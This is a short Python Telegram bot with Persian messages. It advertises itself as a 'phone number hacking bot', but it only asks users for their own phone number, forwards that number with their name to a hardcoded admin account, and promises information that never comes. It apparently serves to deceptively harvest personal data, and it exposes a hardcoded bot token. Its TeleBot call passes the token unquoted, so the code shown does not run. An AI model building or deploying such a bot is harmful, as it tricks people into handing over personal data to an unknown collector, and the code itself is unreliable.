import telebot
from telebot import types

TOKEN = '7533787995:AAGYwq9HsjxbAoyFg2b13-PwX4vauF6QGc0'

ADMIN_ID = 5332806502

bot = telebot.TeleBot(7533787995:AAGYwq9HsjxbAoyFg2b13-PwX4vauF6QGc0)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("👨🏻‍💻 ارسال شماره تلفن")
    item2 = types.KeyboardButton("ℹ️ درباره ما")
    markup.add(item1, item2)
    bot.send_message(message.chat.id, f"سلام {message.from_user.first_name} 👋\nبه ربات هک شماره خوش اومدی!\nلطفاً یکی از گزینه‌ها رو انتخاب کن:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "👨🏻‍💻 ارسال شماره تلفن")
def ask_phone(message):
    msg = bot.send_message(message.chat.id, "لطفاً شماره تلفن خود را وارد کنید:")
    bot.register_next_step_handler(msg, forward_number_to_admin)

def forward_number_to_admin(message):
    text = message.text
    user = message.from_user
    # ارسال شماره 
    bot.send_message(ADMIN_ID, f"شماره جدید از {user.first_name} {user.last_name or ''}:\n{text}")
    # پاسخ به خود کاربر
    bot.send_message(message.chat.id, "شماره شما دریافت شد ✅\nبه زودی برای شما اطلاعات ارسال میشود.")

@bot.message_handler(func=lambda m: m.text == "ℹ️ درباره ما")
def about_us(message):
    bot.send_message(message.chat.id, "ندونی بهتره. 💼")

print("ربات روشن شد...")
bot.infinity_polling()